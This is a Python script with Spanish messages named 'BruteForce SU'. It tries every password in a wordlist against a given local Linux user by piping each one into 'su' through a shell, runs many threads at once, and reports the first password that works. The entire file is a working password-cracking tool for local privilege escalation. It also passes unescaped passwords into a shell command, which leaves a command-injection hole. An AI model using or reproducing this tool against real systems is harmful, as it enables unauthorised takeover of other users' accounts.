import sys
import subprocess
import signal
import threading
from colorama import Fore, Style, init

init(autoreset=True)  # Inicializar colorama

def mostrar_ayuda():
    print(f"{Fore.YELLOW}Uso: {sys.argv[0]} USUARIO DICCIONARIO [-t|--threads NUMERO]")
    print(f"{Fore.RED}Se deben especificar tanto el nombre de usuario como el archivo de diccionario.{Style.RESET_ALL}")
    sys.exit(1)

def imprimir_banner():
    print(f"{Fore.BLUE}")
    print("******************************")
    print("*     BruteForce SU         *")
    print("******************************")
    print(f"{Style.RESET_ALL}")

def finalizar(signal, frame):
    print(f"{Fore.RED}\nFinalizando el script{Style.RESET_ALL}")
    sys.exit()

def probar_contraseña(password, usuario):
    command = f"echo {password} | su {usuario} -c 'echo Hello {usuario}:{password}'"
    try:
        subprocess.run(command, shell=True, check=True, timeout=0.1, stdout=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Contraseña encontrada para el usuario {usuario}: {password}{Style.RESET_ALL}")
        sys.exit(0)  # Salir de todos los threads cuando se encuentra la contraseña
    except subprocess.CalledProcessError:
        pass

def ataque_con_threads(diccionario, usuario, num_threads):
    threads = []

    with open(diccionario, 'r') as diccionario_file:
        for password in diccionario_file:
            password = password.strip()
            print(f"Probando contraseña: {password}")
            thread = threading.Thread(target=probar_contraseña, args=(password, usuario))
            threads.append(thread)

            if len(threads) >= num_threads:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
                threads = []

        # Esperar a que se completen los threads restantes
        for t in threads:
            t.start()
        for t in threads:
            t.join()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, finalizar)

    usuario = None
    diccionario = None
    num_threads = 10  # Valor por defecto

    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == "-t" or sys.argv[i] == "--threads":
            i += 1
            num_threads = int(sys.argv[i])
        elif usuario is None:
            usuario = sys.argv[i]
        elif diccionario is None:
            diccionario = sys.argv[i]
        else:
            mostrar_ayuda()
        i += 1

    if usuario is None or diccionario is None:
        mostrar_ayuda()

    imprimir_banner()
    ataque_con_threads(diccionario, usuario, num_threads)
